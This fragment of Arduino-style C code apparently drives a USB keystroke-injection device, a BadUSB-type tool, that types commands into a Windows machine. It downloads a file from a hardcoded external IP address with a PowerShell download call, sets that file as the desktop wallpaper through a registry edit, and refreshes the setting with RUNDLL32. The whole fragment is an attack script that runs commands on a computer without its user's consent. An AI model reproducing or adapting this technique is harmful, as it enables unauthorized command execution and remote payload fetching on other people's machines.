...
void setup() 
{
  ...
  KeyStroke(KEY_ENTER);
  delay(500);
  char *str4 = "$P.downloadfile(\"http://140.114.200.28/test.bmp\",\"C:/test.bmp\")";
  char *chp4 = str4;
  Print(chp4);
  delay(500);
  KeyStroke(KEY_ENTER);
  ...
  KeyStroke(KEY_ENTER);
  delay(500);
  char *str6 = "reg add \"HKEY_CURRENT_USER\\control panel\\desktop\" /v wallpaper /t REG_SZ /d \"C:/test.bmp\" /f ";
  char *chp6 = str6;
  Print(chp6);
  delay(500);
  KeyStroke(KEY_ENTER);
  char *str7 = "RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True";
  char *chp7 = str7;
  Print(chp7);
  //delay(500);
